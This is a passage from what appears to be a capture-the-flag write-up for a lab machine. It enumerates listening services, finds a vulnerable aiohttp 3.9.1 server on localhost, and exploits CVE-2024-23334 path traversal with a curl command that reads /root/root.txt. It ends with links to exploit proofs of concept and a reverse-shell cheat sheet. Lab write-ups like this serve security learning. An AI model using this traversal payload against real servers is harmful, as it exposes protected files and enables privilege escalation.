Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 localhost:http-alt      0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
udp        0      0 localhost:domain        0.0.0.0:*                          
udp        0      0 0.0.0.0:bootpc          0.0.0.0:*                          
Active UNIX domain sockets (only servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  2      [ ACC ]     SEQPACKET  LISTENING     25710    /run/udev/control
unix  2      [ ACC ]     STREAM     LISTENING     39293    /run/user/1000/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     39300    /run/user/1000/bus
unix  2      [ ACC ]     STREAM     LISTENING     39301    /run/user/1000/gnupg/S.dirmngr
unix  2      [ ACC ]     STREAM     LISTENING     39302    /run/user/1000/gnupg/S.gpg-agent.browser
unix  2      [ ACC ]     STREAM     LISTENING     39303    /run/user/1000/gnupg/S.gpg-agent.extra
unix  2      [ ACC ]     STREAM     LISTENING     25692    @/org/kernel/linux/storage/multipathd
unix  2      [ ACC ]     STREAM     LISTENING     39304    /run/user/1000/gnupg/S.gpg-agent.ssh
unix  2      [ ACC ]     STREAM     LISTENING     39305    /run/user/1000/gnupg/S.gpg-agent
unix  2      [ ACC ]     STREAM     LISTENING     39338    /run/user/1000/pk-debconf-socket
unix  2      [ ACC ]     STREAM     LISTENING     39339    /run/user/1000/snapd-session-agent.socket
unix  2      [ ACC ]     STREAM     LISTENING     25679    /run/systemd/private
unix  2      [ ACC ]     STREAM     LISTENING     25681    /run/systemd/userdb/io.systemd.DynamicUser
unix  2      [ ACC ]     STREAM     LISTENING     25690    /run/lvm/lvmpolld.socket
unix  2      [ ACC ]     STREAM     LISTENING     25695    /run/systemd/fsck.progress
unix  2      [ ACC ]     STREAM     LISTENING     25705    /run/systemd/journal/stdout
unix  2      [ ACC ]     STREAM     LISTENING     26812    /run/systemd/journal/io.systemd.journal
unix  2      [ ACC ]     STREAM     LISTENING     30669    /run/dbus/system_bus_socket
unix  2      [ ACC ]     STREAM     LISTENING     30677    /run/snapd.socket
unix  2      [ ACC ]     STREAM     LISTENING     30679    /run/snapd-snap.socket
unix  2      [ ACC ]     STREAM     LISTENING     30681    /run/uuidd/request
unix  2      [ ACC ]     STREAM     LISTENING     32298    /var/run/vmware/guestServicePipe
unix  2      [ ACC ]     STREAM     LISTENING     32585    /run/irqbalance//irqbalance841.sock
unix  2      [ ACC ]     STREAM     LISTENING     30676    @ISCSIADM_ABSTRACT_NAMESPACE
```

Ok, this seems interesting, there is a webpage running on **http-alt (port 8080)**, which only  listens to localhost.
```
rosa@chemistry:~$ wget http://localhost:8080
--2024-11-17 16:47:53--  http://localhost:8080/
Resolving localhost (localhost)... 127.0.0.1
Connecting to localhost (localhost)|127.0.0.1|:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5971 (5.8K) [text/html]
Saving to: ‘index.html’

index.html                                                 100%[========================================================================================================================================>]   5.83K  --.-KB/s    in 0s      

2024-11-17 16:47:53 (786 MB/s) - ‘index.html’ saved [5971/5971]
```

Confirming that there is a web page on that port, I downloaded the index.html, seems to be a site monitoring page:
```
rosa@chemistry:~$ cat index.html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Monitoring</title>
    <link rel="stylesheet" href="/assets/css/all.min.css">
    <script src="/assets/js/jquery-3.6.0.min.js"></script>
    <script src="/assets/js/chart.js"></script>
    <link rel="stylesheet" href="/assets/css/style.css">
    <style>
    h2 {
      color: black;
      font-style: italic;
    }


    </style>
</head>
<body>
    <nav class="navbar">
        <div class="container">
            <h1 class="logo"><i class="fas fa-chart-line"></i> Site Monitoring</h1>
            <ul class="nav-links">
                <li><a href="#" id="home"><i class="fas fa-home"></i> Home</a></li>
                <li><a href="#" id="start-service"><i class="fas fa-play"></i> Start Service</a></li>
                <li><a href="#" id="stop-service"><i class="fas fa-stop"></i> Stop Service</a></li>
                <li><a href="#" id="list-services"><i class="fas fa-list"></i> List Services</a></li>
                <li><a href="#" id="check-attacks"><i class="fas fa-exclamation-triangle"></i> Check Attacks</a></li>
            </ul>
        </div>
    </nav>
```

I will be using `curl --head` to get the headers of the page, which usually give information on the technology used for creating the web and the versions.
```
rosa@chemistry:~$ curl http://localhost:8080 --head
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Sun, 17 Nov 2024 16:51:24 GMT
Server: Python/3.9 aiohttp/3.9.1
```

With that, we know that the server is using **aiohttp** version **3.9.1**, which is a python async http client/server framework. Looking at the official page, I see that the latest version is 3.11.2, so 3.9.1 is quite old, let's see if it has any known vulnerabilities (we already searched python vulnerabilities on the scan phase): 

- https://github.com/jhonnybonny/CVE-2024-23334
- https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2024-23334
- https://nvd.nist.gov/vuln/detail/cve-2024-23334

Seems that, this version of aiohttp has a path traversal if it has **'follow_symlinks'** enabled, if it works, I will be able to get the root flag directly, assuming is on the root user's home (/root/ I assume, as this is my experience with Ubuntu).

Before doing trial and error, let's see if we can locate the page, as we have access to the server as the user rosa.
```
rosa@chemistry:~$ find / -iname index\.html 2>/dev/null
/usr/lib/python3/dist-packages/twisted/python/_pydoctortemplates/index.html
/usr/share/doc/gdisk/index.html
/usr/share/doc/adduser/examples/adduser.local.conf.examples/skel.other/index.html
/usr/share/doc/shared-mime-info/shared-mime-info-spec.html/index.html
/usr/share/doc/info/html/Index.html
/usr/share/doc/info/html/index.html
/usr/share/doc/python3/python-policy.html/index.html
/usr/share/doc/libexpat1-dev/expat.html/index.html
/home/rosa/index.html
```

I don't see any index.html that correlates with the one we are searching, maybe rosa doesn't have the sufficient permissions to read the web app's directory, makes sense.

So, let's start trying, first I need to get the name of the first folder. I will try assets first, but I could try sources, static...

I finally get it:
```
rosa@chemistry:~$ curl -s --path-as-is http://localhost:8080/assets/../../../../../../root/root.txt
32940374bd93ce016628d888347462eb
```


# Links used
https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346

https://crackstation.net/

https://github.com/z3rObyte/CVE-2024-23334-PoC/blob/main/exploit.sh

https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0

https://book.hacktricks.xyz/es/pentesting-web/file-upload

https://github.com/Ignitetechnologies/Linux-Privilege-Escalation

https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

https://docs.aiohttp.org/en/stable/
